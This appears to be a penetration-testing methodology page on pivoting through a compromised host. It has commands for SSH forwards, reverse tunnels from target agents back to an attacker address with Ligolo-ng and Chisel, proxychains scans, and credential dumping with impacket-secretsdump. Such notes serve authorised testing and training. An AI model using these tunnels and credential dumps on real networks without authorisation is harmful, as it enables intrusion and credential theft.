# Port Forwarding & Tunneling

Port forwarding and tunneling extend your network reach through a compromised host — letting you interact with internal services that aren't directly accessible from your attacker machine. The right tool depends on what's available on the pivot host and what you need to reach.

---

## Methodology

### 1. Identify What You Need to Reach

Before setting up a tunnel, be clear about the goal:

- A single internal port (e.g., RDP on an internal host) → local port forward
- A full internal subnet (e.g., domain controller, internal web apps) → full proxy/pivot
- Reverse access through a restrictive firewall → reverse tunnel

---

### 2. Choose the Right Tool

| Situation | Best tool |
|---|---|
| SSH access to the pivot host | SSH `-L` (local) or `-R` (remote) — no extra tools |
| Need to proxy an entire subnet | Ligolo-ng — full Layer 3 routing |
| Quick single-port tunnel, no SSH | Chisel — lightweight, runs on any OS |
| One-shot relay without installing anything | `socat` or `netcat` |
| Metasploit session active | `route add` + proxychains |

---

### 3. SSH Port Forwarding

**Local forward** — access a remote port locally:

```bash
# Access internal RDP (3389) via localhost:13389
ssh -L 13389:10.10.10.20:3389 user@10.10.10.10
```

**Remote forward** — expose your local port through the target (reverse tunnel):

```bash
ssh -R 4444:localhost:4444 user@10.10.10.10
```

**Dynamic SOCKS proxy** — route any tool through the pivot:

```bash
ssh -D 1080 user@10.10.10.10
# then: proxychains nmap -sT -Pn 10.10.20.0/24
```

---

### 4. Ligolo-ng (Full Subnet Pivoting)

Best option when you need to reach an entire internal network segment. Sets up a proper Layer 3 tunnel — tools don't need proxychains.

```bash
# Attacker: start the proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# Target: run the agent
./agent -connect <attacker-ip>:11601 -ignore-cert

# Attacker: add route to internal subnet
ip route add 10.10.20.0/24 dev ligolo
```

See [Ligolo-ng & Chisel](ligolo-chisel.md) for full setup and multi-hop pivoting.

---

### 5. Chisel (Quick Reverse Tunnel)

Lightweight and works without SSH. Good for a fast single-port forward through a firewall.

```bash
# Attacker: start server
chisel server -p 8080 --reverse

# Target: connect and forward a port
chisel client <attacker-ip>:8080 R:3389:10.10.10.20:3389
```

---

### 6. Route Traffic Through the Tunnel

Once a SOCKS proxy or Ligolo tunnel is active, route tools through it:

```bash
# proxychains (for tools that don't support SOCKS natively)
proxychains nmap -sT -Pn -p 80,443,445 10.10.20.10

# Impacket tools support --proxy natively
impacket-secretsdump -proxy socks5://127.0.0.1:1080 CORP/admin:'pass'@10.10.20.10
```

!!! tip "Real-world"
    Ligolo-ng is the cleanest option for HTB Pro Labs and real internal engagements — once the route is added, every tool works normally without proxychains wrapping. Set it up first before spending time configuring individual SOCKS proxies.
